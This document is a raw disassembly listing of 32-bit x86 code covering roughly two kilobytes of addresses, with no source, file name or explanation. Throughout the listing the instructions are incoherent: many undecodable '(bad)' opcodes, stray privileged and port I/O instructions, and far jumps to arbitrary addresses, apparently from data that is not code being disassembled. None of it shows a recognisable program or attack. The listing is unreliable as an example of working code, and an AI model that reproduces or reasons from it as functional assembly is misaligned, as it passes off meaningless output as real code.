  4123f4:	fsubr  st(1),st
  4123f6:	fsub   DWORD PTR [ebx+eax*1-0x77e5dbd8]
  4123fd:	addr16 sbb eax,0xebad87bc
  412403:	xor    BYTE PTR [edx-0x1ec220b],bl
  412409:	int    0x27
  41240b:	sbb    ebp,DWORD PTR [ecx]
  41240d:	mov    edx,0xa2dfb908
  412412:	push   esp
  412413:	sbb    cl,dl
  412415:	sbb    esp,DWORD PTR [edx+0x66a33c24]
  41241b:	popa   
  41241c:	rcl    BYTE PTR [esi+ebp*4],1
  41241f:	xchg   ebx,eax
  412420:	xor    eax,0xa5d7cdb4
  412425:	int    0x65
  412427:	xor    DWORD PTR [ecx+0x60be87ae],esi
  41242d:	sbb    BYTE PTR [ebp+0x49],ch
  412430:	cs jnp 0x4124ae
  412433:	out    0x16,eax
  412435:	push   edi
  412436:	addr16 bt esi,edx
  41243a:	call   0x8e798d0a
  41243f:	push   ds
  412440:	sahf   
  412441:	cmp    dl,BYTE PTR [edi-0x5eacf444]
  412447:	dec    edi
  412448:	shl    BYTE PTR [eax],0x64
  41244b:	clc    
  41244c:	bt     eax,eax
  41244f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412450:	pop    ss
  412451:	ins    BYTE PTR es:[edi],dx
  412452:	mov    edi,0x688a82db
  412457:	or     DWORD PTR [edi-0x4f],ebx
  41245a:	inc    ebx
  41245b:	or     DWORD PTR [edi-0x4],0xe3484884
  412462:	or     BYTE PTR [ebx+0x3c246f4a],bl
  412468:	lahf   
  412469:	inc    esp
  41246a:	sti    
  41246b:	hlt    
  41246c:	inc    ebp
  41246d:	jge    0x41246c
  41246f:	and    eax,0x45d58191
  412474:	xchg   edx,eax
  412475:	jmp    0x4124ef
  412477:	test   DWORD PTR [ebx-0x195e55d6],eax
  41247d:	jmp    0x8a72702d
  412482:	cmp    dl,al
  412484:	retf   
  412485:	push   0x74cf01ee
  41248a:	pop    esi
  41248b:	rcl    BYTE PTR [ecx],0x7c
  41248e:	in     al,0xee
  412490:	inc    edi
  412491:	stc    
  412492:	dec    edx
  412493:	test   BYTE PTR [edx+0x6e],cl
  412496:	add    eax,DWORD PTR [ebp-0x3cbadcc6]
  41249c:	out    0x13,eax
  41249e:	dec    eax
  41249f:	out    dx,al
  4124a0:	xchg   ebx,eax
  4124a1:	call   0x9436:0x3a883a1a
  4124a8:	adc    BYTE PTR [eax-0x6a45bbdc],0x2c
  4124af:	xchg   ebx,eax
  4124b0:	or     ebp,ecx
  4124b2:	test   bl,dh
  4124b4:	call   0xfe0f504d
  4124b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ba:	daa    
  4124bb:	fstp   QWORD PTR ds:0xc6fe93ba
  4124c1:	jne    0x4124eb
  4124c3:	adc    BYTE PTR [ecx+eiz*8+0x14],dl
  4124c7:	mov    eax,ds:0xb500af8
  4124cc:	mov    eax,ds:0x39a4e75e
  4124d1:	js     0x41249d
  4124d3:	push   eax
  4124d4:	mov    ebp,0xf7e8855c
  4124d9:	and    DWORD PTR [edx+0x67],eax
  4124dc:	retf   
  4124dd:	ja     0x41250c
  4124df:	cmp    bh,cl
  4124e1:	ret    
  4124e2:	and    esp,eax
  4124e4:	ds (bad) 
  4124e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124e8:	mov    WORD PTR es:[esi],ss
  4124eb:	scas   al,BYTE PTR es:[edi]
  4124ec:	call   0xa4ca20c5
  4124f1:	retf   
  4124f2:	into   
  4124f3:	ds adc al,0x96
  4124f6:	push   es
  4124f7:	in     eax,0xf7
  4124f9:	mov    edx,DWORD PTR [bp+si]
  4124fc:	add    DWORD PTR [ebp-0x20],ecx
  4124ff:	mov    dh,0x5b
  412501:	nop
  412502:	retw   
  412504:	fiadd  WORD PTR [edi-0x2c]
  412507:	cmp    al,0xf3
  412509:	push   eax
  41250a:	ja     0x412491
  41250c:	cld    
  41250d:	mov    bh,BYTE PTR ds:0x61fe36e9
  412513:	sti    
  412514:	sub    eax,DWORD PTR [ecx]
  412516:	mov    al,ds:0x5cc80591
  41251b:	inc    ecx
  41251c:	mov    ?,WORD PTR [edx-0x76406651]
  412522:	xor    BYTE PTR [ebp+0x4],dl
  412525:	bound  edx,QWORD PTR [ecx]
  412527:	gs cld 
  412529:	sbb    DWORD PTR [ebx],edi
  41252b:	or     dl,bh
  41252d:	inc    eax
  41252e:	jge    0x4124bd
  412530:	pop    eax
  412531:	test   eax,0xfddf0c42
  412536:	loopne 0x412524
  412538:	jl     0x4124ec
  41253a:	xor    eax,0x3e3b3edd
  41253f:	add    eax,0xcd6a2b0b
  412544:	ja     0x41253c
  412546:	cmp    ah,BYTE PTR [eax-0x5b]
  412549:	mov    esp,0x7ab6620b
  41254e:	dec    eax
  41254f:	sahf   
  412550:	es jl  0x412592
  412553:	sub    eax,esi
  412555:	jp     0x412525
  412557:	enter  0x5b22,0xec
  41255b:	mov    bh,0xf5
  41255d:	adc    DWORD PTR [edi+0x9],ebp
  412560:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412562:	sub    dh,ch
  412564:	call   0x37e4:0x87d61cb
  41256b:	dec    esp
  41256c:	lahf   
  41256d:	and    BYTE PTR [edx-0x517d7ebc],0x36
  412574:	aaa    
  412575:	test   BYTE PTR [ebx],ch
  412577:	jns    0x4125c6
  412579:	aaa    
  41257a:	ins    BYTE PTR es:[edi],dx
  41257b:	xchg   edx,eax
  41257c:	fwait
  41257d:	sub    eax,0xe6c5157
  412582:	push   ebp
  412583:	adc    BYTE PTR [ecx],bh
  412585:	fcom   DWORD PTR [eax-0x6e]
  412588:	imul   ebx,DWORD PTR ds:0x7ffc7c53,0x1a
  41258f:	mov    edi,0x444c888
  412594:	gs out 0x8b,al
  412597:	add    eax,0xd33fd22
  41259c:	xchg   edi,eax
  41259d:	retf   0x10f5
  4125a0:	sbb    dh,dh
  4125a2:	or     eax,0x3b6ffc9c
  4125a7:	inc    esi
  4125a8:	addr16 lahf 
  4125aa:	leave  
  4125ab:	out    dx,eax
  4125ac:	(bad)  
  4125ad:	shl    cl,1
  4125af:	pop    esi
  4125b0:	je     0x412603
  4125b2:	enter  0xd1c3,0x5a
  4125b6:	dec    edx
  4125b7:	add    ebp,0x67
  4125ba:	sub    DWORD PTR [edi],0x7b45af9f
  4125c0:	fs ins DWORD PTR es:[di],dx
  4125c3:	mov    ecx,0xd0413d09
  4125c8:	sbb    al,0xc7
  4125ca:	push   ecx
  4125cb:	inc    ebx
  4125cc:	jg     0x4125d8
  4125ce:	dec    ecx
  4125cf:	outs   dx,BYTE PTR ds:[esi]
  4125d0:	sbb    DWORD PTR [edi],0x9e799bda
  4125d6:	js     0x412591
  4125d8:	sbb    cl,cl
  4125da:	jns    0x412575
  4125dc:	(bad)  
  4125dd:	mov    ah,0x83
  4125df:	cs dec edi
  4125e1:	mov    WORD PTR [ecx+eiz*1],ds
  4125e4:	pop    ss
  4125e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e6:	fsub   DWORD PTR [edx]
  4125e8:	lods   eax,DWORD PTR ds:[esi]
  4125e9:	or     ecx,ecx
  4125eb:	mov    ds:0xcf1483e6,al
  4125f0:	add    al,0x89
  4125f2:	mov    ds:0x5ab38c4f,al
  4125f7:	mov    ebp,0xb81e896c
  4125fc:	mov    edx,0x712d5f1
  412601:	add    DWORD PTR [ebx+0x54],0xffffffa1
  412605:	dec    ecx
  412606:	ins    DWORD PTR es:[edi],dx
  412607:	push   esi
  412608:	je     0x41267d
  41260a:	int    0xac
  41260c:	dec    esp
  41260d:	jne    0x412632
  41260f:	dec    edi
  412610:	outs   dx,BYTE PTR ds:[esi]
  412611:	jnp    0x4125fa
  412613:	dec    eax
  412614:	xor    DWORD PTR ss:[eax+edi*2+0x758771d],0x3b
  41261d:	in     eax,0x4c
  41261f:	clc    
  412620:	repnz sub esp,DWORD PTR [ecx+0x42ee1d4b]
  412627:	lahf   
  412628:	fld    DWORD PTR [eax]
  41262a:	and    al,0xa
  41262c:	addr16 cmc 
  41262e:	xor    DWORD PTR [ecx-0x2d8196a2],edi
  412634:	dec    esp
  412635:	and    eax,0xceff52f
  41263a:	dec    ebp
  41263b:	out    0xd2,al
  41263d:	(bad)  
  41263f:	(bad)  
  412640:	shr    DWORD PTR [esp+edi*1+0x1198afa4],cl
  412647:	mov    edx,0x50d5d404
  41264c:	imul   esp,DWORD PTR [esi+eax*2-0x32c19d5f],0x17645771
  412657:	addr16 or eax,0xb9538a72
  41265d:	jl     0x412628
  41265f:	sbb    ch,BYTE PTR [esi+0x1be64b59]
  412665:	xchg   ecx,eax
  412666:	adc    edx,esi
  412668:	sub    edx,DWORD PTR [edi+esi*4+0x57]
  41266c:	rcr    ebp,1
  41266e:	add    bl,ah
  412670:	xor    esp,ebx
  412672:	ret    
  412673:	mov    dl,0x62
  412675:	popf   
  412676:	or     DWORD PTR [edx+0x2657f24],0x965bc704
  412680:	add    al,0xa9
  412682:	arpl   WORD PTR [edx+0x189b8e7c],ax
  412688:	inc    esi
  412689:	mov    ds:0xd287cccb,al
  41268e:	ret    
  41268f:	(bad)  
  412691:	pop    esi
  412692:	push   esp
  412693:	mov    eax,0x63a85114
  412698:	sub    ebp,DWORD PTR [ebp+0x602430fd]
  41269e:	mov    cl,0xf9
  4126a0:	mov    al,BYTE PTR [edi+0x2a]
  4126a3:	pop    ss
  4126a4:	(bad)  
  4126a5:	jp     0x4126b4
  4126a7:	mov    WORD PTR [ebx-0x1e],ss
  4126aa:	push   ebx
  4126ab:	lea    esp,[ecx+0x4e0be6f7]
  4126b1:	adc    al,ah
  4126b3:	mov    eax,0xcd9ad85d
  4126b8:	fcom   DWORD PTR [ecx+0x23752732]
  4126be:	ins    BYTE PTR es:[edi],dx
  4126bf:	mov    ds:0x3a936491,eax
  4126c4:	repnz inc eax
  4126c6:	arpl   WORD PTR [ebp-0x26],sp
  4126c9:	jmp    0x412671
  4126cb:	popa   
  4126cc:	or     eax,0x620143f8
  4126d1:	push   0x51b86395
  4126d6:	and    esi,DWORD PTR [edx-0x29]
  4126d9:	pushf  
  4126da:	and    ebp,DWORD PTR [esi-0xd32bd46]
  4126e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126e1:	das    
  4126e2:	jp     0x4126f2
  4126e4:	mov    ebp,0x18ddbd91
  4126e9:	mov    ecx,0xa1a4e85e
  4126ee:	jge    0x412712
  4126f0:	and    al,0xd0
  4126f2:	loopne 0x41269c
  4126f4:	push   esp
  4126f5:	fldcw  WORD PTR [ecx-0x27]
  4126f8:	daa    
  4126f9:	fwait
  4126fa:	adc    BYTE PTR gs:[ecx-0x1b02150d],ch
  412701:	xor    BYTE PTR [ebx],cl
  412703:	sahf   
  412704:	stos   DWORD PTR es:[edi],eax
  412705:	mov    eax,0x5d07bce
  41270a:	or     al,0xf8
  41270c:	xor    al,0x63
  41270e:	dec    esp
  41270f:	inc    edi
  412710:	rcl    DWORD PTR [ebx-0x53],0xc3
  412714:	int    0x31
  412716:	pop    ds
  412717:	push   esp
  412718:	js     0x4126dc
  41271a:	jnp    0x41277f
  41271c:	cmp    al,0x5d
  41271e:	sub    dl,BYTE PTR [edi+0x56]
  412721:	sub    BYTE PTR [ebp*1+0x310b7152],al
  412728:	sbb    esp,ebp
  41272a:	(bad)  
  41272b:	nop
  41272c:	xchg   edi,eax
  41272d:	xchg   DWORD PTR [edx-0x4fc09028],ebx
  412733:	lods   al,BYTE PTR ds:[esi]
  412734:	cdq    
  412735:	dec    BYTE PTR [esi]
  412737:	xor    BYTE PTR [edi+0x1de9b5dc],cl
  41273d:	(bad)
  412741:	nop
  412742:	cmp    ebp,DWORD PTR [ecx-0x1bdcbecd]
  412748:	xchg   ebp,eax
  412749:	mov    gs,WORD PTR [esi+0x5d]
  41274c:	push   edi
  41274d:	dec    eax
  41274e:	sub    edx,esp
  412750:	fldenv [ecx+0x3e]
  412753:	add    DWORD PTR [esi+0x4da0ec54],edi
  412759:	shl    BYTE PTR [esi],1
  41275b:	cs popa 
  41275d:	mov    bh,BYTE PTR [ebx+0x6e]
  412760:	pusha  
  412761:	mov    bh,dh
  412763:	repnz pop esi
  412765:	inc    ebp
  412766:	imul   ebp,DWORD PTR [ebx],0xa26358a4
  41276c:	push   es
  41276d:	iret   
  41276e:	pop    ds
  41276f:	icebp  
  412770:	mov    gs,WORD PTR [edx+esi*8]
  412773:	mov    WORD PTR [eax],?
  412775:	jbe    0x412773
  412777:	enter  0xb636,0xf3
  41277b:	cmp    eax,0xa07c054
  412780:	mov    ebx,0x8ca869f4
  412785:	inc    ecx
  412786:	addr16 xchg edx,eax
  412788:	loopne 0x412776
  41278a:	pusha  
  41278b:	pop    edi
  41278c:	adc    ebp,0x2e
  41278f:	cs and al,0x4f
  412792:	sar    BYTE PTR [ebp+ebx*2-0x57],1
  412796:	jge    0x412738
  412798:	push   cs
  412799:	mov    ch,0xeb
  41279b:	les    ebx,FWORD PTR [esi+0x5824513d]
  4127a1:	push   0x36
  4127a3:	cdq    
  4127a4:	or     eax,0x4e06f622
  4127a9:	ins    BYTE PTR es:[edi],dx
  4127aa:	imul   ebx,DWORD PTR [ecx+esi*8-0x7d],0xf1ec156b
  4127b2:	jae    0x4127db
  4127b4:	push   cs
  4127b5:	push   edx
  4127b6:	inc    ecx
  4127b7:	sti    
  4127b8:	cdq    
  4127b9:	and    esp,edi
  4127bb:	scas   eax,DWORD PTR es:[edi]
  4127bc:	(bad)  [esi+0x6]
  4127bf:	outs   dx,DWORD PTR ds:[esi]
  4127c0:	cmc    
  4127c1:	add    DWORD PTR [eax],0x38d37657
  4127c7:	imul   ebp,DWORD PTR [edi-0x1e],0x38
  4127cb:	pop    ds
  4127cc:	(bad)  
  4127cd:	in     al,dx
  4127ce:	mov    dh,0x46
  4127d0:	mov    ecx,0x40257727
  4127d5:	lea    ebx,ds:0x4255887a
  4127db:	cmove  ebp,DWORD PTR [ebp-0x19149f6]
  4127e2:	cmp    al,0x20
  4127e4:	das    
  4127e5:	inc    esp
  4127e6:	(bad)  
  4127e7:	or     ah,al
  4127e9:	xor    eax,0x4f158881
  4127ee:	sub    cl,bl
  4127f0:	leave  
  4127f1:	cmp    BYTE PTR [esi-0x4d],0x61
  4127f5:	pop    ds
  4127f6:	mov    WORD PTR [edx],gs
  4127f8:	lods   al,BYTE PTR ds:[esi]
  4127f9:	dec    edi
  4127fa:	(bad)  
  4127fc:	test   al,0x3a
  4127fe:	dec    esi
  4127ff:	popw   ss
  412801:	mov    ch,0x0
  412803:	shr    dl,0x86
  412806:	push   ss
  412807:	imul   edx,ebp,0x726b32ce
  41280d:	test   al,0xa1
  41280f:	js     0x41287a
  412811:	retf   
  412812:	jmp    0xc3f16d79
  412817:	mov    ds:0x8b8c8ca1,al
  41281c:	stos   BYTE PTR es:[edi],al
  41281d:	mov    edi,gs
  41281f:	popa   
  412820:	in     eax,0xa5
  412822:	retf   0xea76
  412825:	aas    
  412826:	xchg   edx,eax
  412827:	cwde   
  412828:	in     al,dx
  412829:	add    eax,0x7883cf99
  41282e:	faddp  st(0),st
  412830:	ret    0x5fe6
  412833:	mov    eax,ds:0x985097a9
  412838:	loop   0x4127f0
  41283a:	out    0xf3,eax
  41283c:	adc    DWORD PTR [ebp+0x20e5381d],ebx
  412842:	and    ebx,DWORD PTR [ebp-0x26]
  412845:	sub    eax,0x67b6fa5d
  41284a:	xchg   esp,eax
  41284b:	icebp  
  41284c:	dec    dx
  41284e:	inc    eax
  41284f:	adc    bh,cl
  412851:	push   es
  412852:	and    eax,0xa7801ac2
  412857:	pop    ebp
  412858:	(bad)  
  412859:	sub    al,0xe3
  41285b:	sbb    ah,cl
  41285d:	or     WORD PTR ds:0xdcd0b838,si
  412864:	xchg   DWORD PTR [edx],eax
  412866:	lods   eax,DWORD PTR ds:[esi]
  412867:	xchg   edx,eax
  412868:	(bad)  
  41286a:	addr16 jbe 0x4128ca
  41286d:	dec    ebp
  41286e:	es in  al,dx
  412870:	add    BYTE PTR [edi-0x74],0xea
  412874:	or     al,0xd5
  412876:	mov    ch,0xac
  412878:	(bad)  
  412879:	sar    cl,1
  41287b:	outs   dx,BYTE PTR ds:[esi]
  41287c:	(bad)  [eax]
  41287e:	sub    ch,dh
  412880:	mov    bl,0x3
  412882:	ret    
  412883:	inc    ebx
  412884:	mov    ds:0xdf6ebbd7,eax
  412889:	pop    edi
  41288a:	or     esi,esp
  41288c:	jmp    0x5bd3:0x53ec9392
  412893:	out    0x96,al
  412895:	pop    es
  412896:	fwait
  412897:	mov    dl,0xa3
  412899:	mov    al,0x53
  41289b:	sbb    DWORD PTR gs:[ebx+0x552560f3],0x34
  4128a3:	jmp    0xddfb:0x92ff859
  4128aa:	and    eax,DWORD PTR [eax-0x7f41f7a4]
  4128b0:	mov    esp,0xc72c51fa
  4128b5:	cdq    
  4128b6:	add    eax,0x497cc41e
  4128bb:	or     al,0xa7
  4128bd:	nop
  4128be:	sub    edi,DWORD PTR [ebp+0x68]
  4128c1:	(bad)  
  4128c3:	hlt    
  4128c4:	sub    BYTE PTR [eax+0x673fccf8],dh
  4128ca:	inc    esi
  4128cb:	loope  0x41287e
  4128cd:	das    
  4128ce:	push   es
  4128cf:	xchg   ebx,eax
  4128d0:	(bad)  
  4128d1:	lock push es
  4128d3:	jb     0x412880
  4128d5:	pop    ds
  4128d6:	xor    al,0x17
  4128d8:	(bad)  
  4128d9:	int3   
  4128da:	xchg   esp,eax
  4128db:	or     BYTE PTR [ebp+0x12b1a787],cl
  4128e1:	sub    eax,0x343421e8
  4128e6:	mov    bh,0xdb
  4128e8:	imul   eax,DWORD PTR [edi],0x1b
  4128eb:	adc    al,0x0
  4128ed:	lds    edx,FWORD PTR [esp+eax*2-0x74b56c1]
  4128f4:	mov    esi,0x98e83308
  4128f9:	es dec esp
  4128fb:	test   eax,0x40e194d6
  412900:	push   cs
  412901:	inc    ecx
  412902:	test   BYTE PTR [edx],ah
  412904:	mov    esp,0xc0078f96
  412909:	jmp    0x75c1:0x5e7619a9
  412910:	mov    DWORD PTR [edi],0x3752cdee
  412916:	push   edi
  412917:	outs   dx,DWORD PTR ds:[esi]
  412918:	clc    
  412919:	addr16 sub al,0x5b
  41291c:	cli    
  41291d:	mov    ebp,0xe3917ed2
  412922:	cdq    
  412923:	or     BYTE PTR [ebp+0x661d4874],ah
  412929:	sbb    DWORD PTR [ebx+0x36],eax
  41292c:	dec    edx
  41292d:	mov    edx,eax
  41292f:	and    bh,BYTE PTR [eax]
  412931:	mov    dh,0x1a
  412933:	sar    BYTE PTR [eax+0xc],cl
  412936:	push   ds
  412937:	add    al,0xcb
  412939:	(bad)  
  41293a:	imul   esp,DWORD PTR ds:0xede4d2c3,0x5
  412941:	bound  edi,QWORD PTR [edi-0x1a]
  412944:	stc    
  412945:	cli    
  412946:	out    dx,eax
  412947:	mov    ecx,0x427c433d
  41294c:	mov    dl,0x5b
  41294e:	cmp    DWORD PTR [ebx],esp
  412950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412951:	dec    eax
  412952:	jge    0x412924
  412954:	pop    ss
  412955:	loop   0x4129cc
  412957:	test   DWORD PTR cs:[ebp-0x53],edi
  41295b:	xchg   ebp,edx
  41295d:	in     al,dx
  41295e:	stos   BYTE PTR es:[edi],al
  41295f:	enter  0x6246,0xe6
  412963:	jns    0x412939
  412965:	cmp    ecx,0xffffff8b
  412968:	outs   dx,BYTE PTR ds:[esi]
  412969:	(bad)  
  41296b:	mov    eax,ds:0x2ad535e9
  412970:	imul   edi,DWORD PTR [edi-0x7f],0xb949155a
  412977:	jbe    0x412991
  412979:	xchg   edx,eax
  41297a:	inc    esi
  41297b:	pop    ebx
  41297c:	cmc    
  41297d:	xor    ch,BYTE PTR [edi+0x6de57a45]
  412983:	(bad)  
  412984:	jmp    0xb3fe:0xf8d59929
  41298b:	push   es
  41298c:	xor    DWORD PTR [eax],esi
  41298e:	dec    ebp
  41298f:	add    eax,0xd58a336f
  412994:	fcom   QWORD PTR [edx+0x7f]
  412997:	rol    BYTE PTR fs:[eax],0x6
  41299b:	fdiv   QWORD PTR [eax+ebx*1]
  41299e:	pop    ebx
  41299f:	test   eax,0xdc81aa39
  4129a4:	and    eax,0xe0841984
  4129a9:	cs retf 0x8ce
  4129ad:	adc    BYTE PTR [esi-0x4380ab55],bl
  4129b3:	adc    dh,BYTE PTR [ebx+edx*1]
  4129b6:	xchg   esi,eax
  4129b7:	repz aam 0x51
  4129ba:	mov    ds:0x47d62522,eax
  4129bf:	mov    al,0xaf
  4129c1:	adc    eax,0x9bf7cd5f
  4129c6:	add    ecx,ebx
  4129c8:	adc    bl,BYTE PTR [edi-0x5a]
  4129cb:	jae    0x412a0b
  4129cd:	jne    0x412a1f
  4129cf:	jecxz  0x412a23
  4129d1:	xchg   BYTE PTR [edx],ch
  4129d3:	jmp    0xcf9fb462
  4129d8:	(bad)  
  4129d9:	fimul  WORD PTR [ebx+0x73]
  4129dc:	mov    dh,0xbd
  4129de:	fwait
  4129df:	xchg   DWORD PTR [edi+0x52dc8ce0],ebx
  4129e5:	scas   al,BYTE PTR es:[edi]
  4129e6:	jne    0x4129e0
  4129e8:	jmp    0x3a80ea26
  4129ed:	cwde   
  4129ee:	sbb    BYTE PTR [esi+0x7e614b54],0x2e
  4129f5:	mov    edx,0x3cd28036
  4129fa:	add    DWORD PTR [ebp+0x43],ecx
  4129fd:	cdq    
  4129fe:	adc    cl,BYTE PTR [ebx+eiz*4]
  412a01:	push   ecx
  412a02:	ret    
  412a03:	nop
  412a04:	mov    al,ds:0xc1e88fdc
  412a09:	push   0x90c61e45
  412a0e:	mov    ebx,0xc1d2dedf
  412a13:	push   ss
  412a14:	mov    bh,0xa3
  412a16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a17:	jge    0x412a8f
  412a19:	ja     0x4129e4
  412a1b:	cs adc al,0x36
  412a1e:	jg     0x412a49
  412a20:	imul   edx,DWORD PTR [ecx],0xffffff8c
  412a23:	mov    ds,WORD PTR [edi+0x24bb8dd9]
  412a29:	outs   dx,DWORD PTR ds:[esi]
  412a2a:	sbb    ebx,edx
  412a2c:	aaa    
  412a2d:	adc    DWORD PTR [ecx+0x440eb033],0xbc156158
  412a37:	cwde   
  412a38:	inc    esp
  412a39:	popa   
  412a3a:	jl     0x4129f2
  412a3c:	inc    edx
  412a3d:	fsubr  DWORD PTR [edx+0x2f2eda23]
  412a43:	retf   0x4650
  412a46:	sti    
  412a47:	dec    edx
  412a48:	adc    eax,0xf0a35040
  412a4d:	jae    0x412acc
  412a4f:	push   cs
  412a50:	mul    bl
  412a52:	addr16 mov esp,0x94680dcf
  412a58:	push   esp
  412a59:	mov    eax,ds:0xa1f01b57
  412a5e:	imul   eax,DWORD PTR [ecx+0x24915e1c],0x60
  412a65:	dec    ebx
  412a66:	aaa    
  412a67:	push   edx
  412a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a69:	pop    ds
  412a6a:	mov    BYTE PTR [edx+0x4d18537],cl
  412a70:	es pop ecx
  412a72:	mov    bl,0xfc
  412a74:	and    DWORD PTR [ebp-0x4c],edx
  412a77:	mov    dh,0xbb
  412a79:	pop    edx
  412a7a:	add    esp,DWORD PTR [eax+eiz*8]
  412a7d:	(bad)  
  412a7e:	sub    edx,DWORD PTR [edi]
  412a80:	xchg   esp,eax
  412a81:	xor    DWORD PTR [ebx-0x6b976022],0xbf8f040d
  412a8b:	mov    ecx,0xa6805d00
  412a90:	(bad)  
  412a91:	out    dx,eax
  412a92:	mov    esp,0x3ec881a
  412a97:	addr16 sub al,0xe1
  412a9a:	dec    edi
  412a9b:	pop    esi
  412a9c:	pop    ss
  412a9d:	push   0xffffffde
  412a9f:	aad    0x4a
  412aa1:	(bad)  
  412aa2:	int    0xc0
  412aa4:	rcr    dh,1
  412aa6:	retf   
  412aa7:	cli    
  412aa8:	or     eax,0x49ee4f07
  412aad:	mov    ah,BYTE PTR es:[esi]
  412ab0:	pop    ss
  412ab1:	ret    0x28e4
  412ab4:	xchg   edi,eax
  412ab5:	scas   al,BYTE PTR es:[edi]
  412ab6:	(bad)  
  412ab7:	in     eax,dx
  412ab8:	outs   dx,BYTE PTR ds:[esi]
  412ab9:	out    dx,al
  412aba:	xchg   esp,ecx
  412abc:	cmp    BYTE PTR [edx-0x1c],ah
  412abf:	out    dx,al
  412ac0:	popa   
  412ac1:	cs (bad) 
  412ac4:	mov    ds:0x7b234d3c,al
  412ac9:	aas    
  412aca:	jle    0x412a6a
  412acc:	ss push edi
  412ace:	imul   dh
  412ad0:	int    0x9f
  412ad2:	sbb    eax,0x96c7af76
  412ad7:	das    
  412ad8:	or     al,0xca
  412ada:	imul   ecx,DWORD PTR [ebx-0x6370968a],0xffffffec
  412ae1:	push   0x2a924937
  412ae6:	xchg   esp,eax
  412ae7:	lods   al,BYTE PTR ds:[esi]
  412ae8:	push   0x7c
  412aea:	lods   al,BYTE PTR ds:[esi]
  412aeb:	repz cwde 
  412aed:	sbb    eax,0xc20ba037
  412af2:	jo     0x412a97
  412af4:	jle    0x412b0d
  412af6:	mov    ds:0xedfb3262,al
  412afb:	scas   al,BYTE PTR es:[edi]
  412afc:	mov    ebx,0x3971049a
  412b01:	push   edx
  412b02:	in     al,0xd9
  412b04:	mov    ?,WORD PTR [ebx]
  412b06:	(bad)  
  412b07:	pop    ds
  412b08:	int    0x62
  412b0a:	dec    ebx
  412b0b:	xchg   edx,eax
  412b0c:	dec    ebx
  412b0d:	nop
  412b0e:	cmp    al,0x2
  412b10:	sub    DWORD PTR [ebx+0x1a],edi
  412b13:	jb     0x412b01
  412b15:	xchg   esp,eax
  412b16:	dec    edx
  412b17:	cmp    ebp,DWORD PTR [eax-0x41]
  412b1a:	ret    0x5e7c
  412b1d:	jo     0x412abd
  412b1f:	lods   al,BYTE PTR ds:[esi]
  412b20:	addr16 enter 0x387d,0x11
  412b25:	jp     0x412b96
  412b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b29:	lds    esp,FWORD PTR [ebx+0x7c89e49a]
  412b2f:	mov    al,ds:0x2239391b
  412b34:	retf   
  412b35:	(bad)  
  412b37:	push   esi
  412b38:	scas   al,BYTE PTR es:[edi]
  412b39:	push   ds
  412b3a:	int    0xdf
  412b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b3d:	push   ds
  412b3e:	dec    edx
  412b3f:	repnz ins DWORD PTR es:[edi],dx
  412b41:	dec    ebp
  412b42:	xchg   BYTE PTR [ecx-0x5dd2eaea],ch
  412b48:	push   eax
  412b49:	push   ecx
  412b4a:	iret   
  412b4b:	ror    DWORD PTR [ecx+0x671172c0],1
  412b51:	push   eax
  412b52:	in     al,dx
  412b53:	outs   dx,DWORD PTR ds:[esi]
  412b54:	aaa    
  412b55:	js     0x412ba7
  412b57:	xchg   edx,eax
  412b58:	loopne 0x412bd4
  412b5a:	scas   eax,DWORD PTR es:[edi]
  412b5b:	xchg   DWORD PTR [edi-0x71362b51],edx
  412b61:	sbb    ebx,eax
  412b63:	jo     0x412afc
  412b65:	jmp    0x68879005
  412b6a:	inc    eax
  412b6b:	add    eax,0x106d923c
  412b70:	xor    al,0xa5
  412b72:	fdiv   DWORD PTR [ebp+0x7c]
  412b75:	sub    bh,BYTE PTR [edx]
  412b77:	pop    eax
  412b78:	jecxz  0x412bcd
  412b7a:	mov    ch,0x9a
  412b7c:	inc    edx
  412b7d:	pop    ebp
  412b7e:	dec    ecx
  412b7f:	push   es
  412b80:	mov    es,WORD PTR [eax+ebp*1]
  412b83:	(bad)  
  412b84:	sbb    eax,0x2b1d7ee5
  412b89:	cmp    eax,0x7d6f0b24
  412b8e:	xchg   DWORD PTR [eax],esp
  412b90:	xchg   ecx,eax
  412b91:	les    edi,FWORD PTR [eax+0x5c]
  412b94:	(bad)  [edi+0x1c7e74e]
  412b9a:	dec    eax
  412b9b:	pushf  
  412b9c:	inc    ecx
  412b9d:	popa   
  412b9e:	dec    eax
  412b9f:	adc    DWORD PTR [esi+0x33],ebx
  412ba2:	enter  0xb0dc,0xb1
  412ba6:	or     DWORD PTR [esp-0x57],0xffffff99
  412bab:	dec    esp
  412bac:	and    eax,0x6080975f
  412bb1:	cmp    eax,0xd7d9b83e
  412bb6:	pop    edi
  412bb7:	jl     0x412b5d
  412bb9:	inc    edi
  412bba:	push   es
  412bbb:	mov    ?,WORD PTR [ecx+0x2f5c8a14]
  412bc1:	sbb    eax,0xd3f012a6
  412bc6:	je     0x412c23
  412bc8:	dec    eax
  412bc9:	shl    DWORD PTR [ebp+0x1ba6d3d8],0x99
  412bd0:	ss mov dh,0x3e
  412bd3:	mov    ah,0xe4
  412bd5:	fild   WORD PTR [ecx]
  412bd7:	mov    bl,0x7a
  412bd9:	pop    eax
  412bda:	lea    esi,[ecx-0x19]
  412bdd:	dec    ecx
  412bde:	addr16 dec ebp
  412be0:	pop    ecx
  412be1:	pop    ds
  412be2:	fs jmp 0xa997:0xdd638f0a
  412bea:	ins    BYTE PTR es:[edi],dx
  412beb:	sbb    DWORD PTR [ebx-0x60],edx
  412bee:	pop    ebp
  412bef:	out    0x57,al
  412bf1:	dec    eax
  412bf2:	cdq    
  412bf3:	pop    ebp
  412bf4:	popf   
  412bf5:	xor    eax,0x78ca2690
  412bfa:	jmp    0x412bb4
  412bfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bfd:	retf   0x4100
  412c00:	(bad)  
  412c01:	pop    esp
  412c02:	pusha  
  412c03:	push   eax
  412c04:	mov    dh,0x74
